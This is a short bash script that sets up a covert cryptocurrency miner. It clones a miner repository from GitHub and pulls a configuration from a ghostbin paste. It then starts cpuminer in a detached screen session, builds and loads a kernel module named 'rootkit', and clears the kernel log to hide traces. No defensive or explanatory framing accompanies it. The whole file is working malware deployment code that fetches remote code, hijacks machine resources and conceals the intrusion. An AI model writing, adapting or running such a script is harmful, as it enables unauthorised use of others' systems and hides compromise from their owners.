#!/bin/bash
rmmod rootkit
dmesg
mv /miner temp1
mkdir /miner
cd /miner
git clone https://github.com/martinezkenneth886/Zarrassa.git
cd Zarrassa
rm config.json
NEW_UUID=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
curl https://ghostbin.com/K192K/raw  | sed "s/Miner/$NEW_UUID/g" > config.json
chmod 777 /miner/*
chmod 777 /miner/Zarrassa/*
chmod 777 /miner/Zarrassa/binaries/*
chmod 777 /miner/Zarrassa/rootkit/*
screen -d -m /miner/Zarrassa/cpuminer.sh
cd rootkit
make
dmesg -C
insmod rootkit.ko
dmesg 
